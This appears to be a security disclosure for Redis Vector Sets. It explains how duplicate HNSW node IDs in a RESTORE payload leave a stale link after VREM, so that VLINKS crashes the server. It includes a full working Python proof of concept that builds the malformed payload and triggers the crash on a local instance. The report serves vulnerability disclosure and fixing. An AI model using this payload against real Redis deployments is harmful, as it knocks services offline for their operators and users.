## Summary

Vector Set RDB/RESTORE accepts multiple serialized HNSW nodes with the same internal node ID. `hnsw_deserialize_index()` builds an ID-to-pointer table and checks reciprocal links by hashing node IDs, but it does not reject duplicate node IDs and does not verify reciprocal links using the resolved node pointers.

A malformed payload can therefore pass the ID-level reciprocal check while creating a non-reciprocal pointer graph. After one node is removed with `VREM`, another node can retain a link to the freed node. A later `VLINKS` dereferences that stale link and crashes the Redis process.

Impact: authenticated clients with `RESTORE` and Vector Set command access, or an attacker able to supply a malicious RDB/replication payload, can trigger a denial of service.

## Root Cause

`VectorSetRdbLoad()` loads each serialized node and calls `hnsw_insert_serialized()`, then resolves all stored link IDs through `hnsw_deserialize_index()`:

```c
// modules/vector-sets/vset.c:2111
hnswNode *node = hnsw_insert_serialized(vset->hnsw, vector, params, params_count, nv);

// modules/vector-sets/vset.c:2128
if (!hnsw_deserialize_index(vset->hnsw, salt[0], salt[1])) goto ioerr;
```

`hnsw_insert_serialized()` trusts `params[0]` as the node ID and does not enforce uniqueness:

```c
// modules/vector-sets/hnsw.c:2589
uint64_t id = params[0];

// modules/vector-sets/hnsw.c:2604
node = hnsw_node_new(index, id, NULL, vector, 0, level, 0);
```

During deserialization, duplicate IDs are inserted into the hash table as separate nodes. Later link resolution stops at the first node with the requested ID:

```c
// modules/vector-sets/hnsw.c:2753
uint64_t bucket = hnsw_hash_node_id(node->id) & (table_size-1);

// modules/vector-sets/hnsw.c:2821
if (table[bucket] && table[bucket]->id == linked_id) {
    neighbor = table[bucket];
    break;
}
```

The reciprocal check hashes `(this_node_id, linked_id, level)` and only validates that each ID pair appears twice:

```c
// modules/vector-sets/hnsw.c:2812
secure_pair_mixer_128(salt0, salt1, this_node_id, linked_id, (uint64_t)i, &mixed_h1, &mixed_h2);

// modules/vector-sets/hnsw.c:2848
if (accumulator[0] || accumulator[1]) goto corrupted;
```

With duplicate node IDs, this ID-level check can succeed even though the resolved pointers are not reciprocal.

## Trigger

The PoC constructs a Vector Set with three nodes:

```text
a: id=1, links to id=2
b: id=1, no links
c: id=2, links to id=1
```

Because `a` and `b` share ID `1`, `c -> id=1` resolves to `b`, while `a -> id=2` resolves to `c`. The accumulator sees two links between IDs `1` and `2` and accepts the graph, but the actual pointer graph is:

```text
a -> c
c -> b
```

When `VREM bad c` deletes `c`, `hnsw_unlink_node()` only walks `c`'s outgoing links and tries to remove a backlink from `b`. It never removes `a -> c` because `c` did not point back to `a`:

```c
// modules/vector-sets/hnsw.c:1891
for (uint32_t i = 0; i < node->layers[level].num_links; i++) {
    hnswNode *linked = node->layers[level].links[i];
    for (uint32_t j = 0; j < linked->layers[level].num_links; j++) {
        if (linked->layers[level].links[j] == node) {
            ...
        }
    }
}

// modules/vector-sets/hnsw.c:1988
hnsw_node_free(node);
```

`VLINKS bad a` then dereferences the stale `a -> c` link:

```c
// modules/vector-sets/vset.c:1483
struct vsetNodeVal *nv = node->layers[i].links[j]->value;

// modules/vector-sets/vset.c:1484
RedisModule_ReplyWithString(ctx, nv->item);
```

The existing runtime binary reproducibly exits with `SIGSEGV` at `RM_ReplyWithString`.

## PoC

Run:

```bash
python3 poc.py
```

```python
#!/usr/bin/env python3
import atexit
import os
import shutil
import socket
import struct
import subprocess
import sys
import tempfile
import time
from pathlib import Path


REPO = Path(__file__).resolve().parents[2]
REDIS_SERVER = Path(os.environ.get("REDIS_SERVER", REPO / "src/redis-server"))
RDB_VERSION = 14


class RespError(Exception):
    pass


def find_free_port():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.bind(("127.0.0.1", 0))
    port = s.getsockname()[1]
    s.close()
    return port


def read_resp(sock):
    def read_line():
        data = b""
        while not data.endswith(b"\r\n"):
            chunk = sock.recv(1)
            if not chunk:
                raise EOFError("connection closed")
            data += chunk
        return data[:-2]

    first = read_line()
    prefix = first[:1]
    if prefix == b"+":
        return first[1:]
    if prefix == b"-":
        raise RespError(first[1:].decode("utf-8", "replace"))
    if prefix == b":":
        return int(first[1:])
    if prefix == b"$":
        length = int(first[1:])
        if length == -1:
            return None
        data = b""
        while len(data) < length + 2:
            chunk = sock.recv(length + 2 - len(data))
            if not chunk:
                raise EOFError("connection closed during bulk read")
            data += chunk
        return data[:length]
    if prefix == b"*":
        length = int(first[1:])
        if length == -1:
            return None
        return [read_resp(sock) for _ in range(length)]
    raise RuntimeError(f"unknown RESP prefix: {first!r}")


def redis_cmd(port, *args, timeout=3):
    with socket.create_connection(("127.0.0.1", port), timeout=timeout) as sock:
        request = f"*{len(args)}\r\n".encode()
        for arg in args:
            if isinstance(arg, str):
                arg = arg.encode()
            request += b"$%d\r\n" % len(arg) + arg + b"\r\n"
        sock.sendall(request)
        return read_resp(sock)


def enc_len(value):
    if value < 64:
        return bytes([value])
    if value < (1 << 14):
        return bytes([0x40 | (value >> 8), value & 0xff])
    if value <= 0xffffffff:
        return b"\x80" + struct.pack("!I", value)
    return b"\x81" + struct.pack("!Q", value)


def load_len(buf, pos):
    b = buf[pos]
    pos += 1
    typ = (b & 0xC0) >> 6
    if typ == 0:
        return b & 0x3f, pos
    if typ == 1:
        return ((b & 0x3f) << 8) | buf[pos], pos + 1
    if b == 0x80:
        return struct.unpack("!I", buf[pos:pos + 4])[0], pos + 4
    if b == 0x81:
        return struct.unpack("!Q", buf[pos:pos + 8])[0], pos + 8
    raise ValueError("encoded lengths are not expected here")


def module_uint(value):
    return enc_len(2) + enc_len(value)


def module_string(data):
    return enc_len(5) + enc_len(len(data)) + data


def serialized_node(element, node_id, links):
    # One level-0 node, HNSW serialization version 1.
    m = 16
    params = [
        node_id,
        (1 << 24),       # version=1, level=0
        len(links),
        m * 2,           # layer-0 max_links
    ]
    params.extend(links)
    params.append(0)             # worst_idx=0, worst_distance=0
    params.append(0x3f800000)    # l2=1.0, qrange=0

    out = module_string(element.encode())
    out += module_string(struct.pack("<ff", 1.0, 0.0))
    out += module_uint(len(params))
    for param in params:
        out += module_uint(param)
    return out


def build_payload(module_id):
    body = bytearray([7]) + enc_len(module_id)  # RDB_TYPE_MODULE_2 + module id
    body += module_uint(2)          # vector dimension
    body += module_uint(3)          # elements
    body += module_uint(16 << 8)    # quant_type=f32, M=16
    body += module_uint(0)          # save_flags

    # Duplicate HNSW node ID 1 lets the ID-level reciprocal check pass while
    # the resolved pointer graph is actually: a -> c, c -> b.
    body += serialized_node("a", 1, [2])
    body += serialized_node("b", 1, [])
    body += serialized_node("c", 2, [1])

    body += enc_len(0)                         # module EOF opcode
    body += struct.pack("<H", RDB_VERSION)     # DUMP footer version
    body += b"\x00" * 8                        # zero checksum: accepted by RESTORE
    return bytes(body)


def main():
    if not REDIS_SERVER.exists():
        print(f"[-] redis-server not found: {REDIS_SERVER}")
        return 1

    port = find_free_port()
    workdir = tempfile.mkdtemp(prefix="redis-vset-dupid-poc.")
    logfile = Path(workdir) / "redis.log"

    env = os.environ.copy()
    env.setdefault("MALLOC_CONF", "junk:true")

    proc = subprocess.Popen(
        [
            str(REDIS_SERVER),
            "--port", str(port),
            "--bind", "127.0.0.1",
            "--protected-mode", "no",
            "--save", "",
            "--appendonly", "no",
            "--dir", workdir,
            "--dbfilename", "dump.rdb",
            "--logfile", str(logfile),
        ],
        env=env,
    )

    def cleanup():
        if proc.poll() is None:
            try:
                redis_cmd(port, "SHUTDOWN", "NOSAVE", timeout=1)
            except Exception:
                proc.terminate()
            try:
                proc.wait(timeout=3)
            except subprocess.TimeoutExpired:
                proc.kill()
        if os.environ.get("KEEP_REDIS_POC") != "1":
            shutil.rmtree(workdir, ignore_errors=True)

    atexit.register(cleanup)

    for _ in range(100):
        try:
            if redis_cmd(port, "PING") == b"PONG":
                break
        except Exception:
            time.sleep(0.05)
    else:
        print("[-] Redis did not start")
        if logfile.exists():
            print(logfile.read_text(errors="replace"))
        return 1

    try:
        redis_cmd(port, "VADD", "seed", "VALUES", "2", "1", "0", "seed", "NOQUANT", "M", "16")
    except RespError as exc:
        print(f"[-] VADD is unavailable in this binary: {exc}")
        return 1

    seed_dump = redis_cmd(port, "DUMP", "seed")
    if not seed_dump or seed_dump[0] != 7:
        print("[-] Unexpected DUMP payload for Vector Set seed")
        return 1

    module_id, _ = load_len(seed_dump, 1)
    payload = build_payload(module_id)

    redis_cmd(port, "RESTORE", "bad", "0", payload, "REPLACE")
    print("[+] RESTORE accepted malformed Vector Set")
    print("[+] VLINKS bad a before delete:", redis_cmd(port, "VLINKS", "bad", "a"))
    print("[+] VLINKS bad c before delete:", redis_cmd(port, "VLINKS", "bad", "c"))

    redis_cmd(port, "VREM", "bad", "c")
    print("[+] Deleted node c; node a now retains a stale HNSW link")

    try:
        reply = redis_cmd(port, "VLINKS", "bad", "a", timeout=2)
        print("[-] Trigger unexpectedly returned:", reply)
    except Exception as exc:
        print(f"[+] Trigger connection closed: {exc}")

    time.sleep(0.5)
    ret = proc.poll()
    if ret is None:
        print("[-] Redis is still alive; crash did not reproduce")
        return 1

    print(f"[+] Redis exited with code {ret}")
    if logfile.exists():
        tail = logfile.read_text(errors="replace")[-3000:]
        print("[+] redis.log tail:")
        print(tail)

    if ret != 0:
        print("[+] Reproduced crash")
        return 0
    print("[-] Redis exited cleanly, expected a crash")
    return 1


if __name__ == "__main__":
    raise SystemExit(main())

```

Expected result:

```text
[+] RESTORE accepted malformed Vector Set
[+] Deleted node c; node a now retains a stale HNSW link
[+] Trigger connection closed
[+] Redis exited with code -11
[+] Reproduced crash
```
